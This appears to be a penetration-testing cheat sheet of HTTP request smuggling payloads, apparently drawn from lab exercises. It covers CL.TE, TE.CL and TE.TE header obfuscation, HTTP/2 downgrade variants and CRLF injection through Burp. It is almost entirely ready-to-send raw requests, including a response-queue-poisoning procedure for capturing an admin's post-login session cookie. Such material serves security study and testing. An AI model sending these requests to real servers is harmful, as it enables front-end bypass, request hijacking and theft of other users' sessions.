# Request Smuggling

## Finding CL.TE vulnerabilities using timing techniques
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

a
b
```

## Finding TE.CL vulnerabilities using timing techniques
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100
Transfer-Encoding: chunked

0

x
```

## CL.TE vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## TE.CL vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-length: 4
Transfer-Encoding: chunked

2b
GPOST / HTTP/1.1
Content-Length: 15

x=1
0
\n\r
\n\r
```

## TE.TE behavior: obfuscating the TE header
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## H2.CL vulnerabilities
```
POST / HTTP/2
Host: vulnerable-website.com
Content-Length: 0

SMUGGLED
```
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

## H2.TE vulnerabilities
```
POST / HTTP/2
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

SMUGGLED
```
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

## Response queue poisoning via H2.TE request smuggling
```
POST /x HTTP/2
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: vulnerable-website.com
```
Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

## HTTP/2 request smuggling via CRLF injection
1. Send the most recent POST / request to Burp Repeater and remove your session cookie before resending the request.
2. Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.
3. Using the Inspector, add an arbitrary header to the request. Append the sequence \r\n to the header's value, followed by the Transfer-Encoding: chunked header:

__Name__
```
foo
```
__Value__
```
bar\r\n
Transfer-Encoding: chunked
```

4. In the body, attempt to smuggle an arbitrary prefix as follows:
```
0

SMUGGLED
```
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
